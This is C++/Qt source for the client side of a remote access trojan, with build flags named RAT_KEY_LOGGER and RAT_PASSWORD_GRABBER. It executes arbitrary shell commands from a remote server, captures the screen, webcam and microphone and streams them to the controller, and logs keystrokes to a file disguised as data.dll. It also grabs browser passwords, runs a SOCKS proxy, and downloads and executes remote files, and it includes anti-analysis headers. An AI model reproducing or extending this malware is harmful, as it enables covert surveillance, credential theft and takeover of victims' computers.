#include "../config.h"

#include <QProcess>
#include <QRegularExpression>
#include <QScreen>
#include <QUrl>
#include <QWindow>
#include <QSysInfo>
#include <QStandardPaths>
#include <QSettings>
#include <QDesktopServices>
#include <QDir>
#include <QGuiApplication>
#include <QAudioRecorder>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QNetworkRequest>

#include <QTemporaryFile>
#ifdef QT_MULTIMEDIA_LIB
#   include <QCamera>
#   include <QCameraInfo>
#   include "webcamimagesurface.h"
#endif

#ifdef QT_WIDGETS_LIB
#   include <QMessageBox>
#   include "desktoplockdialog.h"
#endif

#if (RAT_USE_SCREEN_LITE == 1)
#   include "ScreenCapture.h"
#   include "internal/SCCommon.h"
#endif
#if (RAT_KEY_LOGGER == 1)
#   include "keylogger.h"
#endif
#if (RAT_PASSWORD_GRABBER == 1)
#   include "browserhelper.h"
#endif
#include "../common/objectcache.h"
#include "../common/variantwrapper.h"
#include "../common/objectcache.h"
#include "../common/features.h"
#include "../common/audiohub.h"
#include "screencaster.h"
#include "sockshub.h"


#include "client.h"

#if (RAT_USE_AL_KHASER == 1)
#include "al-khaser/pch.h"
#endif

#if (RAT_INPUT_EMU == 1)
#   include "inputmanager.h"
#endif

#ifdef Q_OS_WIN
#   include <qt_windows.h>
#endif

#if (RAT_FILE_DOWNLOADER == 1)
#   include "filedownloader.h"
#endif

QString Client::serverAddress() const
{
    return _serverAddress;
}

void Client::setServerAddress(const QString &serverAddress)
{
    _serverAddress = serverAddress;
}

Client::Client()
{
}

void Client::pingSlot()
{
    qDebug()<< Q_FUNC_INFO;
    setOs("Changed os");
}

QVariant Client::infoSlot()
{
    qDebug() << Q_FUNC_INFO;
    QVariantMap map;
    map.insert("version", RAT_CLIENT_VERSION);
    map.insert("platform", RAT_PLATFORM_NAME);
    map.insert("kernelType", QSysInfo::kernelType());
    map.insert("buildAbi", QSysInfo::buildAbi());
    map.insert("productType", QSysInfo::productType());
    map.insert("productVersion", QSysInfo::productVersion());
    map.insert("prettyProductName", QSysInfo::prettyProductName());

    map.insert("features", Features::currentPlatformFeatures());

    return map;
}

QVariant Client::tasksSlot()
{
#ifdef Q_OS_LINUX
    VariantWrapper v;
    v.setHeader(QStringList() << "pid" << "cpu" << "cmd" << "user");

    auto process = new QProcess;
    process->setProgram("ps");
    process->setArguments(QStringList() << "axo"
                                        << "pid,%cpu,comm,user");
    process->start();
    process->waitForFinished();

    QString psOutput = process->readAllStandardOutput();
    QStringList processList = psOutput.split('\n');

    processList.removeFirst();
    processList.removeLast();

    QRegularExpression r("\\s*(\\S+)\\s+(\\S+)\\s+(\\S+)\\s+(\\S+)\\s*");
    foreach (QString p, processList) {
        auto m = r.match(p);
        v.addRow({
                     m.captured(1),
                     m.captured(2),
                     m.captured(3),
                     m.captured(4)
                 });
    }
    return v.data();
#endif
#ifdef Q_OS_WIN
    VariantWrapper v;
    v.setHeader(QStringList() << "pid" << "name" << "section" << "user" << "status" << "usage" << "title");

    auto process = new QProcess;
    process->setProgram("tasklist");
    process->setArguments(QStringList() << "/V" << "/NH");
    process->start();
    process->waitForFinished();

    QString psOutput = process->readAllStandardOutput();
    QStringList processList = psOutput.split('\n');

    processList.removeFirst();
    processList.removeLast();

    //Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
    QRegularExpression r(R"~(^(?<name>.+)\s{2,}(?<pid>\d+)\s(?<section>\w+)\s{2,}\d\s{2,}(?<usage>\S+\s\w)\s(?<status>\w+)\s{2,}(?<user>.*?)\s{2,}(\S+)\s(?<title>.+)$)~");
    foreach (QString p, processList) {
        auto m = r.match(p);

        v.addRow({
                     m.captured("pid"),
                     m.captured("name"),
                     m.captured("section"),
                     m.captured("user"),
                     m.captured("status"),
                     m.captured("usage"),
                     m.captured("title")
                 });
    }
    return v.data();
#endif
    return QVariantList();
}

void Client::messageBoxSlot(QString title, QString text, int icons)
{
    Q_UNUSED(icons)
#ifdef QT_WIDGETS_LIB
    QMessageBox::information(nullptr, title, text);
#else
#   ifdef Q_OS_WIN
    MessageBoxA(NULL, text.toUtf8().data(), title.toUtf8().data(), MB_ICONINFORMATION);
#   endif
#   ifdef Q_OS_LINUX
    QProcess::execute("xmessage", QStringList() << "-buttons" << "OK:1" << "-center"
                      << "-title" << title
                      << text );
#   endif
#endif
}

QVariant Client::startupItemsSlot()
{
    QVariantList list;
#ifdef Q_OS_LINUX
    auto read_desktop_Files = [&list](const QString &path) {
        QDir d(path);
        auto files = d.entryInfoList(QStringList() << "*.desktop");
        foreach (QFileInfo desktopFile, files) {
            QVariantMap map;
            QFile df(desktopFile.absoluteFilePath());
            if (!df.open(QIODevice::ReadOnly))
                continue;

            QRegularExpression r("Exec=(.*)");
            auto m = r.match(df.readAll());

            map["path"] = desktopFile.absoluteFilePath();
            map["exec"] = m.captured(1);
            list.append(map);
            df.close();
        }
    };
    read_desktop_Files("/etc/xdg/autostart");
    read_desktop_Files(QDir::homePath() + "/.config/autostart/");
#endif
#ifdef Q_OS_WIN
    auto read_registry = [&list](const QString &path){
        QSettings reg(path, QSettings::NativeFormat);
        auto keys = reg.childKeys();
        foreach (QString k, keys) {
            QVariantMap map;
            map["path"] = k;
            map["exec"] = reg.value(k).toString();
            list.append(map);
        }
    };
    read_registry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    read_registry("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");

#endif
    return list;
}

void Client::shutdownSlot()
{
#ifdef Q_OS_LINUX
    QProcess::execute("shutdown", QStringList() << "--reboot" << "--no-wall");
#else
    QProcess::execute("shutdown", QStringList() << "-s" << "-t" << "0");
#endif
}

void Client::rebootSlot()
{
#ifdef Q_OS_LINUX
    QProcess::execute("shutdown", QStringList() << "--poweroff" << "--no-wall");
#else
    QProcess::execute("shutdown", QStringList() << "-r" << "-t" << "0");
#endif
}

void Client::logoutSlot()
{
    QProcess::execute("shutdown", QStringList() << "-l");
}

QVariant Client::executeSlot(QString command, QString dir)
{
    if (command.startsWith("cd ")) {
        auto path = command.mid(3);

        if (!QDir(path).isAbsolute()) {
            if (dir.endsWith("/"))
                path.prepend(dir);
            else
                path.prepend(dir + "/");
        }

        QVariantMap map;
        map.insert("path", path);
        map.insert("ok", QDir(path).exists());
        return map;
    }

    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(command);
    p.waitForFinished();
    QVariantMap map;
    map.insert("code", p.exitCode());
    map.insert("out", p.readAllStandardOutput());
    map.insert("err", p.readAllStandardError());
    return map;
}

QImage Client::screenshotSlot()
{
#if (RAT_LIB_SCREEN_CAPTURE == 1)

    //Setup Screen Capture for all monitors
    auto framgrabber =  SL::Screen_Capture::CreateCaptureConfiguration([]() {
            //add your own custom filtering here if you want to capture only some monitors
            return SL::Screen_Capture::GetMonitors();
        })->onNewFrame([&](const SL::Screen_Capture::Image& img, const SL::Screen_Capture::Monitor& monitor) {
            img.Bounds
        })->start_capturing();

    framgrabber->setFrameChangeInterval(std::chrono::milliseconds(100));//100 ms
    framgrabber->setMouseChangeInterval(std::chrono::milliseconds(100));//100 ms
#endif

    QScreen *screen = QGuiApplication::primaryScreen();
    //    if (const QWindow *window = windowHandle())
    //        screen = window->screen();
    //    if (!screen)
    //        return QImage();

    return screen->grabWindow(0).toImage();
}

QImage Client::webcamImageSlot()
{
    QVariantList list;
    auto cameras = QCameraInfo::availableCameras();
    foreach (auto c, cameras)
        list.append(c.deviceName());

    return QImage();
}

QVariant Client::dirEntriesSlot(QString path)
{
#ifdef Q_OS_LINUX
    if (path.isEmpty())
        path = "/";
#endif
    QDir d(path);
    auto files = d.entryList(QDir::Files);
    auto dirs = d.entryList(QDir::Dirs | QDir::NoDotAndDotDot);

    QStringList filesList;
    foreach (QFileInfo fi, files)
        filesList.append(fi.fileName());

    QStringList dirsList;
    foreach (QFileInfo di, dirs)
        dirsList.append(di.fileName());

    QVariantMap map;
    map["files"] = filesList;
    map["dirs"] = dirsList;
    return map;
}

void Client::visitWebsiteSlot(QString url, int mode)
{
    Q_UNUSED(mode)
    auto u = QUrl(url);

    if (u.isValid())
        QDesktopServices::openUrl(u);
}

int Client::killProcessSlot(int pid)
{
    return QProcess::execute("pkill", QStringList() << QString::number(pid));
}

QStringList Client::camerasSlot()
{
#ifdef QT_MULTIMEDIA_LIB
    QStringList ret;
    auto cameraList = QCameraInfo::availableCameras();
    foreach (auto c, cameraList)
        ret.append(c.deviceName());
    return ret;
#else
    return QVariantList();
#endif
}

bool Client::startCameraSlot(QByteArray deviceName)
{
#ifdef QT_MULTIMEDIA_LIB
    if (!ObjectCache::instance()->contains<WebcamImageSurface>()) {
        auto w = new WebcamImageSurface(deviceName);
        ObjectCache::instance()->add(w, 10000L);
    }
    return true;
#else
    return false;
#endif
}

void Client::stopCameraSlot()
{
#ifdef QT_MULTIMEDIA_LIB
    ObjectCache::instance()->remove<WebcamImageSurface>();
#endif
}

QImage Client::cameraFrameSlot()
{
#ifdef QT_MULTIMEDIA_LIB
    auto webcam = ObjectCache::instance()->get<WebcamImageSurface>();
    if (webcam)
        return webcam->image();
#endif
    return QImage();
}

QVariant Client::systemInformationsSlot()
{
    QVariantList list;
    auto add = [&list](const QString &name, const QString &value){
        QVariantMap map;
        map.insert("name", name);
        map.insert("value", value);
        list.append(map);
    };
    add("buildAbi", QSysInfo::buildAbi());
    add("buildCpuArchitecture", QSysInfo::buildCpuArchitecture());
    add("currentCpuArchitecture", QSysInfo::currentCpuArchitecture());
    add("kernelType", QSysInfo::kernelType());
    add("kernelVersion", QSysInfo::kernelVersion());
    add("machineHostName", QSysInfo::machineHostName());
    add("prettyProductName", QSysInfo::prettyProductName());
    add("productType", QSysInfo::productType());
    add("productVersion", QSysInfo::productVersion());
    add("home", QDir::homePath());

    return list;
}

bool Client::startVncSlot()
{
    auto s = ObjectCache::instance()->add<ScreenCaster>(5000);
    s->start();
    return true;
}

bool Client::startRemoteDesktopSlot(int width, int heigth, int colors, int port)
{
    auto screenCaster = new ScreenCaster(this);
    screenCaster->setServerAddress(_serverAddress);
    screenCaster->setPort(port);
    screenCaster->setWidth(width);
    screenCaster->setHeigth(heigth);
    screenCaster->setFormat(static_cast<QImage::Format>(colors));

    ObjectCache::instance()->add(screenCaster, -1);

    screenCaster->start();
    return true;
#if (RAT_USE_VLC == 1)
    const char* params[] = {"screen-top=0",
                                "screen-left=0",
                            "screen-width=640",
                                "screen-height=480",
                                "screen-fps=10"};
    libvlc_instance_t *inst = libvlc_new(0, 0);
//#transcode{vcodec=h264,acodec=mpga,ab=128,channels=2,samplerate=44100,scodec=none}:display :no-sout-all :sout-keep
    libvlc_vlm_add_broadcast(inst, "mybroad",
                             "screen://",
                "#transcode{vcodec=h264,vb=800,scale=1,acodec=mpga,ab=128,channels=2,samplerate=44100}:http{mux=ts,dst=:7777/}",
                             5, params, // <= 5 == sizeof(params) == count of parameters
                             1, 0);
    libvlc_vlm_play_media(inst, "mybroad");

    return true;
#endif
}

void Client::endRemoteDesktopSlot()
{
    auto s = ObjectCache::instance()->get<ScreenCaster>();
    if (s) {
        s->stop();
        ObjectCache::instance()->remove<ScreenCaster>(false);
    }
}

void Client::mouseClickSlot(QPoint pt, int key)
{
#if (RAT_INPUT_EMU == 1)
    INPUTMANAGER->pressMouse(pt, static_cast<Qt::MouseButton>(key));
    INPUTMANAGER->releaseMouse(pt, static_cast<Qt::MouseButton>(key));
#endif
}

void Client::mousePressSlot(QPoint pt, int key)
{
#if (RAT_INPUT_EMU == 1)
    INPUTMANAGER->pressMouse(pt, static_cast<Qt::MouseButton>(key));
#endif
}

void Client::mouseReleaseSlot(QPoint pt, int key)
{
#if (RAT_INPUT_EMU == 1)
    INPUTMANAGER->releaseMouse(pt, static_cast<Qt::MouseButton>(key));
#endif
}

void Client::mouseMoveSlot(QPoint pt, int key)
{
#if (RAT_INPUT_EMU == 1)
    Q_UNUSED(key)
    INPUTMANAGER->moveMouse(pt, Qt::NoButton);
#endif
}

void Client::keyPressSlot(int key, int modifs)
{
#if (RAT_INPUT_EMU == 1)
    INPUTMANAGER->pressKey(static_cast<Qt::Key>(key),
                           static_cast<Qt::KeyboardModifiers>(modifs));

#endif
}

void Client::lockDesktopSlot()
{
#ifdef USE_QT_WIDGETS_LIB
    auto d = new DesktopLockDialog();
    d->showFullScreen();
    ObjectCache::instance()->add(d);
#endif
}

void Client::unlockDesktopSlot()
{
#ifdef USE_QT_WIDGETS_LIB
    auto d = ObjectCache::instance()->get<DesktopLockDialog>();
    if (d) {
        d->close();
        ObjectCache::instance()->remove<DesktopLockDialog>();
    }
#endif
}

bool Client::startSocksProxySlot(int port, qreal throttle)
{
    Q_UNUSED(throttle)
    auto server = ObjectCache::instance()->add<SocksHub>(-1);
    server->setPort(static_cast<quint16>(port));
    server->setServerAddress(_serverAddress);
    return server->start();
}

QVariant Client::querySocksProxySlot()
{
    QVariantMap map;
    auto server = ObjectCache::instance()->get<SocksHub>();

    if (server) {
        map.insert("status", true);
        map.insert("server", server->serverAddress());
        map.insert("port", server->port());
    } else {
        map.insert("status", false);
    }
    return map;
}

bool Client::requestNewConnectionSlot()
{
    auto server = ObjectCache::instance()->get<SocksHub>();

    if (!server) {
        qDebug() << "No socksHub";
        return false;
    }

//    server->makeNewConnection();
    return true;
}

bool Client::endSocksProxySlot()
{
    auto server = ObjectCache::instance()->get<SocksHub>();

    if (server)
        server->deleteLater();

    return ObjectCache::instance()->remove<SocksHub>();
}

QVariant Client::detectorSlot()
{
    return  QVariant();
}

bool Client::startKeyloggerSlot()
{
#if (RAT_KEY_LOGGER == 1)
    auto k = new KeyLogger;
    k->start();
    ObjectCache::instance()->add(k);
    return k->isRunning();
#else
    return false;
#endif
}

bool Client::queryKeyloggerSlot()
{
#if (RAT_KEY_LOGGER == 1)
    auto k = ObjectCache::instance()->get<KeyLogger>();
    return k && k->isRunning();
#else
    return false;
#endif
}

bool Client::stopKeyloggerSlot()
{
#if (RAT_KEY_LOGGER == 1)
    auto k = ObjectCache::instance()->get<KeyLogger>();
    k->quit();
//    k->deleteLater();
//    return ObjectCache::instance()->remove<KeyLogger>();
    return true;
#else
    return false;
#endif
}

QString Client::keyloggerFileSlot()
{
#if (RAT_KEY_LOGGER == 1)
    auto path = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation)
                         + "/data.dll";

    if (QFile::exists(path))
        return path;
#else
    return QString();
#endif
}

QVariant Client::grabUrlsSlot()
{
#if (RAT_PASSWORD_GRABBER == 1)
    return BrowserHelper::tabs();
#else
    return QVariant();
#endif
}

QStringList Client::registryChilds(QString &path)
{
    QSettings reg(path, QSettings::NativeFormat);
    return reg.childKeys();
}

QVariantList Client::registryKeys(QString &path)
{
    QVariantList list;
    QSettings reg(path, QSettings::NativeFormat);
    return list;
}

QStringList Client::micListSlot()
{
    QAudioRecorder a;
    return a.audioInputs();
}

bool Client::startMicSpySlot(QString deviceName, int port)
{
    auto hub = new AudioHub(AudioHub::Tcp);
    ObjectCacheInstance->add(hub, -1);
    hub->startClient(deviceName, _serverAddress, port);
    return true;
}

bool Client::queryMicSpySlot()
{
    auto hub = ObjectCacheInstance->get<AudioHub>();
    if  (!hub)
        return false;
    return hub->isRunning();
}

bool Client::stopMicSpySlot()
{
    auto hub = ObjectCacheInstance->get<AudioHub>();
    if (!hub)
        return true;
    hub->deleteLater();
    return true;
}

QVariantList Client::passwordsSlot()
{
#if (RAT_PASSWORD_GRABBER == 1)
    return BrowserHelper::passwords();
#else
    return QVariantList();
#endif
}

void Client::downloadAndExecSlot(QString url)
{
#if (RAT_FILE_DOWNLOADER == 1)
    auto dl = new FileDownloader(url, this);
    dl->setAutoExec(true);
    dl->setAutoExec(true);
    dl->startDownload();
#else
    Q_UNUSED(url)
#endif
}
